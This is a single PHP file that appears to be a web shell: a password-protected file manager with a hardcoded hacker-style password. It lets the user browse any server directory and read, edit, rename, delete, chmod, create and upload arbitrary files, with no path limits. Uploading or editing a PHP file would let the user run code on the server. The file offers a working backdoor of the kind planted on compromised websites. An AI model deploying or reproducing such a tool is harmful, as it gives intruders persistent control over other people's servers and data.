<?php
session_start();

$correctPassword = 'astahaxor1337';

if (isset($_POST['password']) && $_POST['password'] === $correctPassword) {
    $_SESSION['authenticated'] = true;
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    unset($_SESSION['authenticated']);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css">
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background-color: #f8f9fa;
            }
            .container {
                max-width: 400px;
                padding: 20px;
                background: white;
                border-radius: 5px;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
            }
            .container h1 {
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="text-center">Login</h1>
            <form method="POST" action="">
                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" id="password" name="password" class="form-control" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
            </form>
        </div>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    <?php
    exit;
}

function listFiles($dir) {
    return is_dir($dir) ? array_diff(scandir($dir), ['.', '..']) : [];
}

function showFiles($dir) {
    foreach (listFiles($dir) as $file) {
        $fullPath = realpath($dir . DIRECTORY_SEPARATOR . $file);
        $isDir = is_dir($fullPath);
        echo '<div class="card mb-2">
                <div class="card-body d-flex justify-content-between align-items-center">
                    <div>
                        <h5 class="card-title mb-0">' . htmlspecialchars($file) . '</h5>
                        <p class="card-text mb-0 text-muted">Path: ' . htmlspecialchars($fullPath) . '</p>
                    </div>
                    <div>';
        if ($isDir) {
            echo '<a href="?dir=' . urlencode($fullPath) . '" class="btn btn-outline-secondary btn-sm">Open</a>';
        } else {
            echo '<a href="?action=view&file=' . urlencode($fullPath) . '" class="btn btn-outline-primary btn-sm">View</a>
                  <a href="?action=edit&file=' . urlencode($fullPath) . '" class="btn btn-info btn-sm">Edit</a>
                  <a href="?action=rename&file=' . urlencode($fullPath) . '" class="btn btn-warning btn-sm">Rename</a>
                  <a href="?action=delete&file=' . urlencode($fullPath) . '" class="btn btn-danger btn-sm" onclick="return confirm(\'Are you sure?\')">Delete</a>
                  <a href="?action=chmod&file=' . urlencode($fullPath) . '" class="btn btn-secondary btn-sm">Chmod</a>';
        }
        echo '</div></div></div>';
    }
}

function viewFile($file) {
    if (file_exists($file)) {
        echo '<pre>' . htmlspecialchars(file_get_contents($file)) . '</pre>';
    } else {
        echo 'File not found!';
    }
}

function renameFile($oldName, $newName) {
    return file_exists($oldName) && !file_exists($newName) ? rename($oldName, $newName) : false;
}

function deleteFile($file) {
    return file_exists($file) ? unlink($file) : false;
}

function saveFile($file, $content) {
    return file_put_contents($file, $content);
}

function chmodFile($file, $mode) {
    return chmod($file, octdec($mode));
}

function uploadFile($file) {
    $uploadDir = __DIR__ . '/uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }
    return move_uploaded_file($file['tmp_name'], $uploadDir . basename($file['name']));
}

function makeDirectory($dir) {
    return !is_dir($dir) ? mkdir($dir, 0755, true) : false;
}

function makeFile($file) {
    return file_put_contents($file, '') !== false;
}

$rootDir = __DIR__;
$currentDir = $rootDir;

$action = $_GET['action'] ?? '';
$file = $_GET['file'] ?? '';
$newName = $_POST['new_name'] ?? '';
$content = $_POST['content'] ?? '';
$mode = $_POST['mode'] ?? '';
$uploadFile = $_FILES['upload_file'] ?? null;
$newDir = $_POST['new_dir'] ?? '';
$newFile = $_POST['new_file'] ?? '';

if (isset($_GET['dir'])) {
    $currentDir = realpath($_GET['dir']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css">
    <style>
        body {
            padding-top: 20px;
        }
        .container {
            max-width: 1200px;
        }
        .editor {
            height: 400px;
        }
        .card {
            margin-bottom: 10px;
        }
        .btn {
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="mb-4">File Manager</h1>
        <div class="mb-4">
            <a href="?action=logout" class="btn btn-danger">Logout</a>
            <a href="?dir=<?php echo urlencode($rootDir); ?>" class="btn btn-secondary">Home</a>
        </div>

        <?php
        switch ($action) {
            case 'view':
                echo '<div class="card mb-4">
                        <div class="card-body">
                            <h5 class="card-title">View File</h5>';
                viewFile($file);
                echo '    </div>
                    </div>';
                break;

            case 'rename':
                echo '<div class="card mb-4">
                        <div class="card-body">
                            <h5 class="card-title">Rename File</h5>';
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    echo renameFile($file, $newName) ? '<div class="alert alert-success">File renamed successfully!</div>' : '<div class="alert alert-danger">Error renaming file!</div>';
                } else {
                    echo '<form method="POST" class="mb-4">
                            <div class="mb-3">
                                <label for="new_name" class="form-label">New name</label>
                                <input type="text" class="form-control" id="new_name" name="new_name" value="' . htmlspecialchars(basename($file)) . '">
                            </div>
                            <button type="submit" class="btn btn-primary">Rename</button>
                          </form>';
                }
                echo '    </div>
                    </div>';
                break;

            case 'delete':
                echo '<div class="card mb-4">
                        <div class="card-body">
                            <h5 class="card-title">Delete File</h5>';
                echo deleteFile($file) ? '<div class="alert alert-success">File deleted successfully!</div>' : '<div class="alert alert-danger">Error deleting file!</div>';
                echo '    </div>
                    </div>';
                break;

            case 'edit':
                echo '<div class="card mb-4">
                        <div class="card-body">
                            <h5 class="card-title">Edit File</h5>';
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    echo saveFile($file, $content) ? '<div class="alert alert-success">File saved successfully!</div>' : '<div class="alert alert-danger">Error saving file!</div>';
                } else {
                    echo '<form method="POST" class="mb-4">
                            <div class="mb-3">
                                <label for="content" class="form-label">Content</label>
                                <textarea id="content" name="content" class="form-control editor" rows="10">' . htmlspecialchars(file_get_contents($file)) . '</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Save</button>
                          </form>';
                }
                echo '    </div>
                    </div>';
                break;

            case 'chmod':
                echo '<div class="card mb-4">
                        <div class="card-body">
                            <h5 class="card-title">Change Permissions</h5>';
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    echo chmodFile($file, $mode) ? '<div class="alert alert-success">Permissions changed successfully!</div>' : '<div class="alert alert-danger">Error changing permissions!</div>';
                } else {
                    echo '<form method="POST" class="mb-4">
                            <div class="mb-3">
                                <label for="mode" class="form-label">Mode (e.g., 0755)</label>
                                <input type="text" class="form-control" id="mode" name="mode" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Change Permissions</button>
                          </form>';
                }
                echo '    </div>
                    </div>';
                break;

            default:
                if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($uploadFile)) {
                    echo uploadFile($uploadFile) ? '<div class="alert alert-success">File uploaded successfully!</div>' : '<div class="alert alert-danger">Error uploading file!</div>';
                }

                if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($newDir)) {
                    echo makeDirectory($newDir) ? '<div class="alert alert-success">Directory created successfully!</div>' : '<div class="alert alert-danger">Error creating directory!</div>';
                }

                if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($newFile)) {
                    echo makeFile($newFile) ? '<div class="alert alert-success">File created successfully!</div>' : '<div class="alert alert-danger">Error creating file!</div>';
                }

                echo '<div class="card mb-4">
                        <div class="card-body">
                            <h5 class="card-title">Upload File</h5>
                            <form method="POST" enctype="multipart/form-data">
                                <div class="mb-3">
                                    <input type="file" class="form-control" name="upload_file">
                                </div>
                                <button type="submit" class="btn btn-primary">Upload</button>
                            </form>
                        </div>
                    </div>';

                echo '<div class="card mb-4">
                        <div class="card-body">
                            <h5 class="card-title">Create Directory</h5>
                            <form method="POST">
                                <div class="mb-3">
                                    <input type="text" class="form-control" name="new_dir" placeholder="Directory path">
                                </div>
                                <button type="submit" class="btn btn-primary">Create Directory</button>
                            </form>
                        </div>
                    </div>';

                echo '<div class="card mb-4">
                        <div class="card-body">
                            <h5 class="card-title">Create File</h5>
                            <form method="POST">
                                <div class="mb-3">
                                    <input type="text" class="form-control" name="new_file" placeholder="File path">
                                </div>
                                <button type="submit" class="btn btn-primary">Create File</button>
                            </form>
                        </div>
                    </div>';

                echo '<div class="card mb-4">
                        <div class="card-body">
                            <h5 class="card-title">Files</h5>';
                showFiles($currentDir);
                echo '    </div>
                    </div>';
                break;
        }
        ?>
    </div>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
</body>
</html>
